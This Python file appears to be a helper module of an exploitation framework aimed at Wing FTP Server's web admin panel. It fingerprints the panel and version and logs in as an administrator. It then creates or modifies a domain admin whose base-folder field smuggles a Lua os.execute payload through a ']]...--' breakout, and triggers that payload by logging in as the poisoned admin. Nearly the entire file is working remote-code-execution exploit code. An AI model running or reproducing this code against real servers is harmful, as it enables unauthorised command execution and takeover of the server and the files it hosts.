#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import re
from typing import Any, Dict, List, Optional, Tuple

import requests

from core.framework.base_module import BaseModule

_PANEL_MARKERS = (
    "wing ftp",
    "wftpserver",
    "admin_login.html",
    "service_login.html",
)

_VERSION_RES = (
    re.compile(r"wing\s*ftp[^0-9]{0,32}(\d+\.\d+\.\d+)", re.I),
    re.compile(r"wftpserver[^0-9]{0,32}(\d+\.\d+\.\d+)", re.I),
    re.compile(r'["\']version["\'][^0-9]{0,16}(\d+\.\d+\.\d+)', re.I),
    re.compile(r"version[^\d]{0,8}(\d+\.\d+\.\d+)", re.I),
)


class WingFtp(BaseModule):
    """Helpers shared by Wing FTP Server modules."""

    DEFAULT_PORT = 5466

    @staticmethod
    def wing_ftp_normalize_base_path(path_value: Any) -> str:
        value = str(path_value or "/").strip()
        if not value or value == "/":
            return ""
        if not value.startswith("/"):
            value = "/" + value
        return value.rstrip("/")

    @classmethod
    def wing_ftp_join_path(cls, base_path: Any, *parts: str) -> str:
        root = cls.wing_ftp_normalize_base_path(base_path)
        clean = [part.strip("/") for part in parts if part and str(part).strip("/")]
        if not clean:
            return root or "/"
        suffix = "/".join(clean)
        if not root:
            return "/" + suffix
        return f"{root}/{suffix}"

    @staticmethod
    def wing_ftp_version_tuple(version: str) -> Tuple[int, ...]:
        parts: List[int] = []
        for token in str(version).split("."):
            digits = "".join(ch for ch in token if ch.isdigit())
            parts.append(int(digits) if digits else 0)
        while len(parts) < 3:
            parts.append(0)
        return tuple(parts[:3])

    @classmethod
    def wing_ftp_version_lte(cls, version: str, limit: str) -> bool:
        if not version or not limit:
            return False
        return cls.wing_ftp_version_tuple(version) <= cls.wing_ftp_version_tuple(limit)

    @staticmethod
    def wing_ftp_extract_version(text: str) -> str:
        if not text:
            return ""
        for pattern in _VERSION_RES:
            match = pattern.search(text)
            if match:
                return match.group(1)
        return ""

    @staticmethod
    def wing_ftp_looks_like_panel(text: str) -> bool:
        if not text:
            return False
        low = text.lower()
        return any(marker in low for marker in _PANEL_MARKERS)

    @staticmethod
    def wing_ftp_parse_json_response(response: Any) -> Optional[dict]:
        if not response:
            return None
        try:
            payload = response.json()
        except (ValueError, json.JSONDecodeError, AttributeError):
            return None
        return payload if isinstance(payload, dict) else None

    @staticmethod
    def wing_ftp_lua_os_execute(command: str) -> str:
        escaped = str(command).replace("\\", "\\\\").replace('"', '\\"')
        return f'os.execute("{escaped}")'

    @staticmethod
    def wing_ftp_poisoned_basefolder(lua_payload: str) -> str:
        return f"/tmp/x]]{lua_payload}--"

    @staticmethod
    def wing_ftp_admin_object(
        username: str,
        password: str,
        poisoned_basefolder: str,
    ) -> dict:
        return {
            "username": username,
            "password": password,
            "readonly": False,
            "domainadmin": 1,
            "domainlist": "",
            "mydirectory": poisoned_basefolder,
            "ipmasks": [],
            "enable_two_factor": False,
            "two_factor_code": "",
        }

    @staticmethod
    def wing_ftp_option_bool(value: Any) -> bool:
        if isinstance(value, bool):
            return value
        if hasattr(value, "value"):
            value = value.value
        if isinstance(value, str):
            return value.strip().lower() in ("true", "yes", "y", "1", "on")
        return bool(value)

    def wing_ftp_panel_referer(self, page: str, base_path: str = "/") -> str:
        proto = "https" if self.wing_ftp_option_bool(getattr(self, "ssl", False)) else "http"
        target = str(getattr(self, "target", "") or "")
        port = int(getattr(self, "port", self.DEFAULT_PORT) or self.DEFAULT_PORT)
        path = self.wing_ftp_join_path(base_path, page.lstrip("/"))
        return f"{proto}://{target}:{port}{path}"

    def wing_ftp_probe_panel(self, base_path: str = "/", timeout: int = 15) -> dict:
        """
        Probe the Wing FTP admin login surface.

        status: panel | not_panel | error
        """
        paths = (
            self.wing_ftp_join_path(base_path, "admin_login.html"),
            self.wing_ftp_join_path(base_path, "service_login.html"),
            self.wing_ftp_join_path(base_path, "main.html"),
        )
        version = ""
        body = ""

        for path in paths:
            try:
                response = self.http_request(
                    method="GET",
                    path=path,
                    allow_redirects=True,
                    timeout=timeout,
                )
            except Exception as exc:
                return {
                    "status": "error",
                    "reason": str(exc),
                    "version": "",
                    "body": "",
                    "path": path,
                }

            if not response:
                continue

            text = response.text or ""
            version = self.wing_ftp_extract_version(text) or version
            if self.wing_ftp_looks_like_panel(text):
                return {
                    "status": "panel",
                    "reason": f"Wing FTP admin panel fingerprint on {path}",
                    "version": version,
                    "body": text,
                    "path": path,
                }
            body = text or body

        return {
            "status": "not_panel",
            "reason": "No Wing FTP admin panel fingerprint",
            "version": version,
            "body": body,
            "path": "",
        }

    def wing_ftp_login(self, username: str, password: str, base_path: str = "/", timeout: int = 15) -> dict:
        url_path = self.wing_ftp_join_path(base_path, "service_login.html")
        headers = {
            "Referer": self.wing_ftp_panel_referer("admin_login.html", base_path),
        }
        data = {
            "username": username,
            "password": password,
        }

        try:
            response = self.http_request(
                method="POST",
                path=url_path,
                data=data,
                headers=headers,
                timeout=timeout,
            )
        except Exception as exc:
            return {"ok": False, "reason": str(exc), "code": None, "two_factor": False}

        payload = self.wing_ftp_parse_json_response(response)
        if payload is not None:
            code = payload.get("code")
            if code == 0:
                return {
                    "ok": True,
                    "reason": "Login successful",
                    "code": code,
                    "two_factor": False,
                    "response": response,
                }
            if code in (1, 2):
                return {
                    "ok": False,
                    "reason": "Two-factor authentication required",
                    "code": code,
                    "two_factor": True,
                    "response": response,
                }
            return {
                "ok": False,
                "reason": f"Login failed: {payload}",
                "code": code,
                "two_factor": False,
                "response": response,
            }

        text = (response.text or "") if response else ""
        if "logged in ok" in text.lower() or "main.html" in text.lower():
            return {
                "ok": True,
                "reason": "Login successful (legacy endpoint)",
                "code": 0,
                "two_factor": False,
                "response": response,
            }

        return {
            "ok": False,
            "reason": f"Login failed: {text[:200]}",
            "code": None,
            "two_factor": False,
            "response": response,
        }

    def wing_ftp_fetch_version_after_login(self, base_path: str = "/", timeout: int = 15) -> str:
        for path in (
            self.wing_ftp_join_path(base_path, "main.html"),
            self.wing_ftp_join_path(base_path, "service_get_server_info.html"),
        ):
            try:
                response = self.http_request(
                    method="GET",
                    path=path,
                    headers={"Referer": self.wing_ftp_panel_referer("main.html", base_path)},
                    allow_redirects=True,
                    timeout=timeout,
                )
            except Exception:
                continue
            if not response or response.status_code != 200:
                continue
            version = self.wing_ftp_extract_version(response.text or "")
            if version:
                return version
        return ""

    def wing_ftp_create_poisoned_admin(
        self,
        poison_username: str,
        poison_password: str,
        lua_payload: str,
        base_path: str = "/",
        timeout: int = 20,
    ) -> dict:
        poisoned_basefolder = self.wing_ftp_poisoned_basefolder(lua_payload)
        admin_obj = self.wing_ftp_admin_object(
            poison_username,
            poison_password,
            poisoned_basefolder,
        )
        url_path = self.wing_ftp_join_path(base_path, "service_add_admin.html")
        headers = {"Referer": self.wing_ftp_panel_referer("main.html", base_path)}
        admin_json = json.dumps(admin_obj, separators=(",", ":"))

        try:
            response = self.http_request(
                method="POST",
                path=url_path,
                files={"admin": (None, admin_json)},
                headers=headers,
                timeout=timeout,
            )
        except Exception as exc:
            return {"ok": False, "reason": str(exc), "modified": False}

        payload = self.wing_ftp_parse_json_response(response)
        if payload is None:
            text = (response.text or "") if response else ""
            return {"ok": False, "reason": f"Unexpected response: {text[:200]}", "modified": False}

        code = payload.get("code")
        if code == 0:
            return {
                "ok": True,
                "reason": "Poisoned domain admin created",
                "modified": False,
                "basefolder": poisoned_basefolder,
            }
        if code == -3:
            result = self.wing_ftp_modify_poisoned_admin(
                poison_username,
                poison_password,
                lua_payload,
                base_path=base_path,
                timeout=timeout,
            )
            result["modified"] = True
            return result

        return {
            "ok": False,
            "reason": f"Failed to create admin: {payload}",
            "modified": False,
        }

    def wing_ftp_modify_poisoned_admin(
        self,
        poison_username: str,
        poison_password: str,
        lua_payload: str,
        base_path: str = "/",
        timeout: int = 20,
    ) -> dict:
        poisoned_basefolder = self.wing_ftp_poisoned_basefolder(lua_payload)
        admin_obj = self.wing_ftp_admin_object(
            poison_username,
            poison_password,
            poisoned_basefolder,
        )
        url_path = self.wing_ftp_join_path(base_path, "service_modify_admin.html")
        headers = {"Referer": self.wing_ftp_panel_referer("main.html", base_path)}
        admin_json = json.dumps(admin_obj, separators=(",", ":"))

        try:
            response = self.http_request(
                method="POST",
                path=url_path,
                files={
                    "admin": (None, admin_json),
                    "oldname": (None, poison_username),
                },
                headers=headers,
                timeout=timeout,
            )
        except Exception as exc:
            return {"ok": False, "reason": str(exc), "modified": True}

        payload = self.wing_ftp_parse_json_response(response)
        if payload is None:
            text = (response.text or "") if response else ""
            return {"ok": False, "reason": f"Unexpected response: {text[:200]}", "modified": True}

        if payload.get("code") == 0:
            return {
                "ok": True,
                "reason": "Poisoned domain admin modified",
                "modified": True,
                "basefolder": poisoned_basefolder,
            }

        return {
            "ok": False,
            "reason": f"Failed to modify admin: {payload}",
            "modified": True,
        }

    def wing_ftp_trigger_payload(
        self,
        poison_username: str,
        poison_password: str,
        base_path: str = "/",
        timeout: int = 20,
    ) -> dict:
        """
        Log in as the poisoned domain admin, then issue a follow-up request so the
        serialized session is loaded and the Lua payload executes.
        """
        trigger_session = requests.Session()
        trigger_session.verify = False

        if hasattr(self, "_configure_session"):
            self._configure_session()
        if hasattr(self, "session") and getattr(self.session, "proxies", None):
            trigger_session.proxies = dict(self.session.proxies)
        if hasattr(self, "session") and getattr(self.session, "headers", None):
            trigger_session.headers.update(dict(self.session.headers))

        proto = "https" if self.wing_ftp_option_bool(getattr(self, "ssl", False)) else "http"
        target = str(getattr(self, "target", "") or "")
        port = int(getattr(self, "port", self.DEFAULT_PORT) or self.DEFAULT_PORT)
        base = self.wing_ftp_normalize_base_path(base_path)
        root = f"{proto}://{target}:{port}{base or ''}"

        login_url = f"{root}{self.wing_ftp_join_path(base_path, 'service_login.html')}"
        trigger_url = f"{root}{self.wing_ftp_join_path(base_path, 'service_get_dir_list.html')}"
        headers = {
            "Referer": self.wing_ftp_panel_referer("admin_login.html", base_path),
        }

        try:
            login_resp = trigger_session.post(
                login_url,
                data={"username": poison_username, "password": poison_password},
                headers=headers,
                timeout=timeout,
                verify=False,
            )
        except Exception as exc:
            return {"ok": False, "reason": f"Trigger login failed: {exc}"}

        headers["Referer"] = self.wing_ftp_panel_referer("main.html", base_path)
        try:
            trigger_resp = trigger_session.post(
                trigger_url,
                data={"dir": ""},
                headers=headers,
                timeout=timeout,
                verify=False,
            )
        except Exception as exc:
            return {"ok": False, "reason": f"Trigger request failed: {exc}"}

        return {
            "ok": True,
            "reason": "Poisoned session loaded",
            "login_status": getattr(login_resp, "status_code", None),
            "trigger_status": getattr(trigger_resp, "status_code", None),
        }
